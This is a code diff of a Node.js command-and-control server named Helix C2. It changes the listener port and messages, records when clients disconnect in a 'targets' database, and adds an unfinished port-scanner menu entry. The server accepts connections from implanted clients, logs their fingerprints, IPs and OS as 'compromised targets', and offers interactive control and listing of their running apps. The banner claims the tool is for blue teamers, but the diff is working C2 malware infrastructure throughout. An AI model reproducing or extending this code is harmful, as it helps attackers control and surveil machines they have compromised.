@@ -13,12 +13,12 @@ const config = require("./config/db/helix.json");
         const admin = await isAdmin();
 
         if (!admin && !isRoot) {
-            console.error("This application must be run with administrative privileges.".red);
+            console.error("[-] Helix must be run with admin privileges!".red);
             process.exit(1);
         } else if (isRoot) {
-            console.log("Running as root user.".green);
+            console.log("[+] Running as root...".green);
         } else {
-            console.log("Running with administrative privileges.".green);
+            console.log("[+] Running with admin privileges...".green);
         }
     };
 
@@ -39,8 +39,8 @@ async function initDB() {
 
 async function insertClientData(clientId, deviceFingerprint, clientAddress, os, connectionTime) {
     const query = `
-        INSERT INTO targets (id, device_finger_print, ip, os, connection_time) 
-        VALUES (?, ?, ?, ?, ?)
+        INSERT INTO targets (id, device_finger_print, ip, os, connection_time, disconnection_time) 
+        VALUES (?, ?, ?, ?, ?, NULL)
     `;
     
     try {
@@ -65,9 +65,10 @@ const header = `
    | |  | |  __/ | |>  <   | |____ / /_ 
    |_|  |_|\\___|_|_/_/\\_\\   \\_____|____|
 
-   - C2 server for blue teamers and network admins (for now)
    - Author: https://github.com/tr3sp4ss3rexe
-   [!] The only payload currently available is a Windows GUI client for now.
+
+   [!] Helix C2 currently available for blue teamers and network admins
+   [!] More payloads will be added soon!
    _______________________________________________________________`;
 
 function printHeader() {
@@ -75,7 +76,7 @@ function printHeader() {
     console.log(header.green);
 }
 
-function setupListener(port = 445) {
+function setupListener(port = 444) {
     server = net.createServer((socket) => {
         const clientId = clientIdCounter++;
         const clientAddress = socket.remoteAddress.replace("::ffff:", "");
@@ -98,38 +99,53 @@ function setupListener(port = 445) {
         
         socket.on("data", (data) => {
             const response = data.toString().trim();
-            
-            
+        
             if (response.includes("OS:")) {
                 os = response.match(/OS: (.+)/)[1];
             }
+        
             if (response.match(/\b[0-9A-F]{4}_.+/)) {
-                deviceFingerprint = response;
+                deviceFingerprint = response.match(/\b[0-9A-F]{4}_.+/)[0];
             }
         
             clients[clientId].data += response + "\n";
         
-            
             if (!dataInserted) {
                 insertClientData(clientId, deviceFingerprint, clientAddress, os, connectionTime);
                 dataInserted = true;
             }
         
-            
             if (clients[clientId].interactiveMode) {
-                
                 process.stdout.write(`${response}\nC2 > `);
             }
         });
+        
 
-        socket.on("end", () => {
+        socket.on("end", async () => {
             console.log(`Client ${clientId} disconnected.`);
+        
+            const disconnectionTime = new Date();
+            await dbConnection.query(
+                `UPDATE targets SET disconnection_time = ? WHERE id = ?`,
+                [disconnectionTime, clientId]
+            );
+        
             delete clients[clientId];
         });
+        
 
-        socket.on("error", (err) => {
+        socket.on("error", async (err) => {
             console.error(`Error with client ${clientId}: ${err.message}`);
+        
+            const disconnectionTime = new Date();
+            await dbConnection.query(
+                `UPDATE targets SET disconnection_time = ? WHERE id = ?`,
+                [disconnectionTime, clientId]
+            );
+        
+            delete clients[clientId];
         });
+        
     });
 
     server.listen(port, () => {
@@ -212,8 +228,6 @@ function interactWithClient(clientId) {
     }
 }
 
-
-
 async function removeClient(clientId) {
     if (clients[clientId]) {
         clients[clientId].socket.end();
@@ -237,17 +251,20 @@ function displayMenu() {
 
     console.log(`
     Listener handling: `.green)
-    console.log(`    1) Start listener on port 1337 (default)
+    console.log(`    1) Start listener on port 444 (default)
     2) Kill listener`)
     console.log(`
     Target handling:`.green)    
     console.log(`    3) List compromised targets
     4) Interact with a target
     5) Show interaction logs
-    6) List running apps on a client
-    7) Remove connected client`)
+    6) List running apps on a target
+    7) Remove connected target`)
     console.log(`
-    8) Exit\n`.red);
+    Reconnaisance:`.green)
+    console.log(`    8) Port scanner`);
+    console.log(`
+    q) Exit\n`.red);
 
     global.rl.question("> ", (choice) => {
         switch (choice.trim()) {
@@ -308,11 +325,15 @@ function displayMenu() {
                 });
                 break;
             case "8":
+                most_used_ports = [20, 21, 22, 23, 25, 53, 80, 110, 161, 443, 3389, 445, 3306];
+                console.log("Scanning for ports: ");
+                break;
+
+            case "q":
                 console.log("Exiting...");
                 global.rl.close();
                 if (server) server.close();
                 process.exit(0);
-                break;
             default:
                 console.log("Invalid choice. Please try again.");
                 waitForUserInput(global.rl);
